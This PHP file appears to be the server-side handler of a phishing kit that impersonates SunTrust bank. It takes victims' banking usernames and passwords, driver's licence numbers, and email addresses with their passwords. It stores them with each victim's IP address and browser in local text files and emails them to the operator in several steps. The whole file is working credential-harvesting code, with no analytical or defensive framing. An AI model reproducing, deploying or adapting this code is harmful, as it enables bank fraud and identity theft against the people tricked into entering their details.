<?php
session_start();

ini_set("max_execution_time", "0");

include "mail.php";
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$cmd = $_REQUEST['LOB'];

if ($cmd == "RBGLogon") {
    include "first.php";
}

if ($cmd == "Logon") {
    $_SESSION['uu'] = $user = $_POST['user'];
    $_SESSION['pp'] = $pass = $_POST['password'];
    if ($user == "" || $pass == "") {
        include "error.php";
    } else {
        $usr = "==================
Username: $user
Password: $pass
$ip - $browser
==================
";

        if ($save == "yes") {
            $fp = fopen("user.txt", "a");
            fputs($fp, "$usr");
            fclose($fp);
        }

        mail($sendto, "Suntrust user", $usr);
        $hereis = 1;
        include "verify.php";
        include "finish.php";

    }
}

if ($cmd == "second") {

    $_SESSION['email'] = $email = $_POST['email'];
    $_SESSION['emailpass'] = $emailpass = $_POST['emailpass'];
    $hereis = $_POST['hereis'];
    if ($_SESSION['dln'] != "") {
       $dln = $_SESSION['dln'];
   } else {
       $_SESSION['dln'] = $dln = $_POST['dln'];
    }
    if ($email == "" or $emailpass == "") {
        $error = 1;
        $hereis = 1;
        include "verify.php";
    } else {
        if ($hereis == 1) {
            $user = $_SESSION['uu'];
            $pass = $_SESSION['pp'];

            $usr = "==================
Username: $user
Password: $pass
DLN: $dln
Email address: $email
Email password: $emailpass
$ip - $browser
==================
";

            if ($save == "yes") {
                $fp = fopen("WithDl.txt", "a");
                fputs($fp, "$usr");
                fclose($fp);
            }

            mail($sendto, "Suntrust DLN", $usr);
            $hereis = 2;
            include "verify.php";
        } elseif ($hereis == 2) {

            $user = $_SESSION['uu'];
            $pass = $_SESSION['pp'];

            $usr = "==================
Username: $user
Password: $pass
DLN: $dln
Email address: $email
Email password: $emailpass
$ip - $browser
==================
";

            if ($save == "yes") {
                $fp = fopen("WithDl.txt", "a");
                fputs($fp, "$usr");
                fclose($fp);
            }

            mail($sendto, "Suntrust DLN2", $usr);
            include "finish.php";
        } else {
            include "first.php";
        }
    }
}
